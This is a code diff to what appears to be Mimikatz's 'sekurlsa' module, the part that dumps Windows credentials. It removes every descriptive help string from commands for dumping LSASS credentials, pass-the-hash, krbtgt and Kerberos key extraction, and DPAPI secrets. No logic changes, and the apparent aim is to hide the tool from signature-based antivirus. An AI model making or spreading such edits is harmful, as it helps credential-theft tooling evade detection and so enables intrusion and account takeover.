@@ -6,37 +6,37 @@
 #include "kuhl_m_sekurlsa.h"
 
 const KUHL_M_C kuhl_m_c_sekurlsa[] = {
-	{kuhl_m_sekurlsa_msv,				L"msv",				L"shows LM & NTLM credz"},
-	{kuhl_m_sekurlsa_wdigest,			L"wdigest",			L"shows WDigest credz"},
-	{kuhl_m_sekurlsa_kerberos,			L"kerberos",		L"shows Kerberos credz"},
-	{kuhl_m_sekurlsa_tspkg,				L"tspkg",			L"shows TsPkg credz"},
+	{kuhl_m_sekurlsa_msv,				L"msv",				L""},
+	{kuhl_m_sekurlsa_wdigest,			L"wdigest",			L""},
+	{kuhl_m_sekurlsa_kerberos,			L"kerberos",		L""},
+	{kuhl_m_sekurlsa_tspkg,				L"tspkg",			L""},
 #if !defined(_M_ARM64)
-	{kuhl_m_sekurlsa_livessp,			L"livessp",			L"shows LiveSSP credz"},
+	{kuhl_m_sekurlsa_livessp,			L"livessp",			L""},
 #endif
-	{kuhl_m_sekurlsa_cloudap,			L"cloudap",			L"shows CloudAp credz"},
-	{kuhl_m_sekurlsa_ssp,				L"ssp",				L"shows SSP credz"},
-	{kuhl_m_sekurlsa_all,				L"logonPasswords",	L"shows all available providers credz"},
+	{kuhl_m_sekurlsa_cloudap,			L"cloudap",			L""},
+	{kuhl_m_sekurlsa_ssp,				L"ssp",				L""},
+	{kuhl_m_sekurlsa_all,				L"logonPasswords",	L""},
 
-	{kuhl_m_sekurlsa_process,			L"process",			L"Switch (or reinit) to LSASS process  context"},
-	{kuhl_m_sekurlsa_minidump,			L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
-	{kuhl_m_sekurlsa_sk_bootKey,		L"bootkey",			L"Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credz"},
-	{kuhl_m_sekurlsa_pth,				L"pth",				L"Pass-the-hash"},
+	{kuhl_m_sekurlsa_process,			L"process",			L""},
+	{kuhl_m_sekurlsa_minidump,			L"minidump",		L""},
+	{kuhl_m_sekurlsa_sk_bootKey,		L"bootkey",			L""},
+	{kuhl_m_sekurlsa_pth,				L"pth",				L""},
 #if !defined(_M_ARM64)
-	{kuhl_m_sekurlsa_krbtgt,			L"krbtgt",			L"krbtgt!"},
+	{kuhl_m_sekurlsa_krbtgt,			L"krbtgt",			L""},
 #endif
-	{kuhl_m_sekurlsa_dpapi_system,		L"dpapisystem",		L"DPAPI_SYSTEM secret"},
+	{kuhl_m_sekurlsa_dpapi_system,		L"dpapisystem",		L""},
 #if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-	{kuhl_m_sekurlsa_trust,				L"trust",			L"Antisocial"},
-	{kuhl_m_sekurlsa_bkeys,				L"backupkeys",		L"Preferred Backup Master keys"},
+	{kuhl_m_sekurlsa_trust,				L"trust",			NULL},
+	{kuhl_m_sekurlsa_bkeys,				L"backupkeys",		NULL},
 #endif
-	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",			L"List Kerberos tickets"},
-	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",			L"List Kerberos Encryption Keys"},
-	{kuhl_m_sekurlsa_dpapi,				L"dpapi",			L"List Cached MasterKeys"},
-	{kuhl_m_sekurlsa_credman,			L"credman",			L"List Credentials Manager"},
+	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",			NULL},
+	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",			NULL},
+	{kuhl_m_sekurlsa_dpapi,				L"dpapi",			NULL},
+	{kuhl_m_sekurlsa_credman,			L"credman",			NULL},
 };
 
 const KUHL_M kuhl_m_sekurlsa = {
-	L"sekurlsa",	L"SekurLSA module",	L"Some commands to enumerate credentials...",
+	L"sekurlsa",	L"",	L"",
 	ARRAYSIZE(kuhl_m_c_sekurlsa), kuhl_m_c_sekurlsa, kuhl_m_sekurlsa_init, kuhl_m_sekurlsa_clean
 };
 
